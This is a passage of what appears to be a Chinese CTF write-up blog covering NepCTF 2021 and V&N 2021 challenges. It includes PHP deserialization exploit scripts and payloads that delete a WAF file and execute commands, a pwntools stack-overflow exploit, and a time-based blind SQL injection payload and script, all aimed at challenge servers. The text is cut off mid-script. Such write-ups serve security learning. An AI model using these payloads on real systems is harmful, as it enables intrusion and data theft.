punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">-></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=shell'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 目录下必须有 shell.php waf.txt</span></span></code></pre><p>得到payload</p><pre class="language-php" data-language="php"><code class="language-php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30<span class="token operator">=</span></code></pre><img src="/article/Nepctf2021/image-20210322161745412.png" class="" title="image-20210322161745412" loading="lazy"><p>读取到<code>shell.php</code>内容</p><pre class="language-php" data-language="php"><code class="language-php">// shell.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">shell</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'so long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>就是传入一个命令，过滤一堆读取函数然后长度要小于10并读取flag。</p><p>稍后再研究，那么现在的问题就是进shell函数，然而进shell函数写死了必须要waf.txt不存在。但waf.txt是有的</p><img src="/article/Nepctf2021/image-20210322162252803.png" class="" title="waf" loading="lazy"><p>这就为难我胖虎了，思路至此over了。</p><hr><h5 id="删除waf-txt："><a href="#删除waf-txt：" class="headerlink" title="删除waf.txt："></a>删除waf.txt：</h5><p>寻找大佬博客文章，找到了指引思路的<a href="https://blog.csdn.net/weixin_42444939/article/details/100781890">文章</a>，2019bytectf的一道web题EzCMS，原题要删除&#x2F;覆盖目录下<code>.hatccess</code>，刚好本题的login类有漏洞可寻，php手册里查找open的同名函数，利用<a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>，其第二个参数里存在能覆盖指定文件的模式，直接删掉<code>waf.txt</code></p><p>于是准备好了phar文件准备‘远程phar’反序列化，但是phar伪协议是不可以远程的</p><img src="/article/Nepctf2021/image-20210322163503746.png" class="" title="phar" loading="lazy"><p>孩子比较呆，测了有一会。这里受到了那题固有思维的影响，其实并不需要打phar反序列化的，由login类中checking函数<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content)</code>，直接令Game类的file new一个ZipArchive()，filename即为waf.txt，content为模式<code>ZipArchive::OVERWRITE | ZipArchive::CREATE</code>，也就是9</p><img src="/article/Nepctf2021/image-20210322164126786.png" class="" title="type" loading="lazy"><p>测试如下</p><img src="/article/Nepctf2021/image-20210322164402187.png" class="" title="del" loading="lazy"><p>可见waf.txt成功被删除，exp2如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token string single-quoted-string">''</span><span class="token string single-quoted-string">'类同上    '</span><span class="token string single-quoted-string">''</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token class-name">OVERWRITE</span> <span class="token operator">|</span> <span class="token class-name">ZipArchive</span><span class="token operator">::</span><span class="token constant">CREATE</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;</code></pre><p>成功删除waf.txt</p><img src="/article/Nepctf2021/image-20210322171241326.png" class="" title="delwaf" loading="lazy"><hr><h5 id="读取flag："><a href="#读取flag：" class="headerlink" title="读取flag："></a>读取flag：</h5><p>ls没过滤，有兴趣可以执行ls看一眼，flag在根目录下</p><p>最后一步，分析shell.php，如何在过滤的情况下读取&#x2F;flag，搜一圈，找到了linux的命令<code>pr</code></p><blockquote><p><strong>pr命令</strong> 用来将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。</p></blockquote><img src="/article/Nepctf2021/image-20210322171800805.png" class="" title="pr" loading="lazy"><p>exp3如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token string single-quoted-string">''</span><span class="token string single-quoted-string">'  类同上  '</span><span class="token string single-quoted-string">''</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'pr /flag'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9</code></pre><p>拿到flag</p><img src="/article/Nepctf2021/image-20210322173545249.png" class="" title="flag" loading="lazy"><p>记录一下，获取类函数名的方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__call'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'open'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'::'</span> <span class="token operator">.</span> <span class="token variable">$method</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h3><img src="/article/Nepctf2021/20210322132920.png" class="" width="20210322132920" loading="lazy"><p>栈溢出，填充0x10，然后找到system cat flag函数，据地址随机化后字节不变，小端更改地址，当图片刷到小蝌蚪的图案便getshell</p><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *context.arch &#x3D; &#39;amd64&#39;context.log_level&#x3D;&#39;debug&#39;#p &#x3D; process(&#39;.&#x2F;xhh&#39;)p &#x3D; remote(&#39;node2.hackingfor.fun&#39;,35402 )#p &#x3D; remote(&#39;127.0.0.1&#39;,12345)payload &#x3D; p64(0) + p64(1) + b&quot;\xE1&quot;p.send(payload)p.interactive()</code></pre><hr><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h3><pre class="language-c#" data-language="c#"><code class="language-c#">private static void Main(string[] args)&#123;    AesClass class2 &#x3D; new AesClass();    string key &#x3D; &quot;&quot;;    string strB &#x3D; &quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH&#x2F;3Wh0&quot;;    byte[] buffer &#x3D; new byte[] &#123;         0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12    &#125;;    Console.WriteLine(&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;);    string str &#x3D; Console.ReadLine();    if (str.Length !&#x3D; 0x25)    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else if ((str.Substring(0, 4) !&#x3D; &quot;Nep&#123;&quot;) || (str[0x24] !&#x3D; &#39;&#125;&#39;))    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else    &#123;        for (int i &#x3D; 0; i &lt; 0x20; i++)        &#123;            key &#x3D; key + Convert.ToChar((int) (buffer[i] ^ 0x33)).ToString();        &#125;        if (string.Compare(class2.AesEncrypt(str, key), strB) &#x3D;&#x3D; 0)        &#123;            Console.WriteLine(&quot;wow, you pass it!&quot;);            Console.ReadKey();        &#125;        else        &#123;            Console.WriteLine(&quot;Nope!&quot;);            Console.ReadKey();        &#125;    &#125;&#125;</code></pre><p>反编译出c#代码</p><p>写exp：</p><pre class="language-none"><code class="language-none">a &#x3D; [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]for i in range(len(a)):    print(chr(a[i] ^ 0x33),end&#x3D;&quot;&quot;)</code></pre><pre class="language-none"><code class="language-none">λ python3 test.pybadbadwomen!!!!!!!!!!!!!!!!!!!!!</code></pre><p>Aes加密网站一波：</p><img src="/article/Nepctf2021/20210322133852.png" class="" width="20210322133852" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很有收获，尤其是《简单的php反序列化》，又学到一个新姿势。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V&amp;N2021公开赛</title>
      <link href="article/VN2021ctf/"/>
      <url>article/VN2021ctf/</url>
      
        <content type="html"><![CDATA[<p>比赛昵称：别答了别答了再答人傻了</p><span id="more"></span><p>比赛情况：</p><img src="/article/VN2021ctf/image-20210315121953685.png" class="" title="image-20210315121953685" loading="lazy"><p>孩子太菜了，后面实在不会做了…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>小游戏题上来就改js</p><img src="/article/VN2021ctf/image-20210315122233099.png" class="" title="image-20210315122233099" loading="lazy"><p>发现游戏关键函数，直接改数据然后<code>Init()</code>,最好疯狂<code>NextLevel()</code>跳到第10关</p><img src="/article/VN2021ctf/image-20210315122433276.png" class="" title="image-20210315122433276" loading="lazy"><p>直接从第十关开始，上去撸boss，出flag</p><img src="/article/VN2021ctf/image-20210315122540586.png" class="" title="image-20210315122540586" loading="lazy"><p>也可以本地保存，直接算js的flag，或者开god模式.<img src="/article/VN2021ctf/image-20210315122714928.png" class="" title="image-20210315122714928" loading="lazy"></p><p>再不行…后面还发现了个函数…<code>boss.Kill()</code></p><hr><h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><p>hint：我的代码不能注入吧</p><img src="/article/VN2021ctf/image-20210315122917856.png" class="" title="image-20210315122917856" loading="lazy"><p>打开登陆界面，第一反应注入，冷静下看数据量很少，拿出祖传20w字典爆破。</p><p>再冷静下测试一下，确认是sql注入</p><pre class="language-none"><code class="language-none">username&#x3D;\&amp;password&#x3D;or 1&#x3D;1# ·不报错username&#x3D;\&amp;password&#x3D;&#39; ·报错username&#x3D;\&amp;password&#x3D;&#39;&#39; ·不报错username&#x3D;\&amp;password&#x3D;&#39;# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or 1&#x3D;0# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or # ·500报错username&#x3D;\&amp;password&#x3D;&#39;and if(1,sleep(10),select 1)# ·不报错无延时username&#x3D;admin&amp;password&#x3D;&#39;and if(0,sleep(10),select 1)# ·不报错无延时发现没啥用...</code></pre><p>推测后端为：<code>select * from user where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p><p>过滤了sleep()可能</p><p>这里没回显的就延时注入，<code>sleep()</code>,<code>Benchmark()</code>,或者笛卡尔积</p><h4 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h4><p>当然延时不精确，count(*)数量大时，费时就高，何况比赛机子<strong>极其不稳定</strong>，不清楚是我卡了还是机器卡了。</p><blockquote><p>笛卡尔积延时注入</p><p>count(*)后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来打时间差，从而达到延时注入的效果</p><p>参考之前的WP：<a href="/article/cqb2021">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p><pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;+-----------+| count(*)  |+-----------+| 113101560 |+-----------+1 row in set (2.07 sec)mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);+------+-----+| user | pwd |+------+-----+| 1    | 0   |+------+-----+1 row in set (2.08 sec)</code></pre></blockquote><p>甚至数量大了把我数据库给跑崩了…</p><img src="/article/VN2021ctf/image-20210315142653488.png" class="" title="image-20210315142653488" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">-1&#39;and if(&#96;payload&#96;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</code></pre><p>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 14, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> randomurl <span class="token operator">=</span> <span class="token string">"http://&#123;&#125;.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span><span class="token comment"># &#123;&#125;由于开了多个靶机，每次随机访问某个靶机，可以减少冲突可能</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    url1 <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 随机访问</span>    <span class="token comment"># print(url1)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># 不限制超时</span>    <span class="token comment"># print(res.text)</span>    <span class="token keyword">if</span> <span class="token string">"504 Gateway Time-out"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span> <span class="token comment"># 504即为正确</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 二分法~</span>    <span class="token comment"># payload = payload.replace("=",">=")</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        time<span class="token 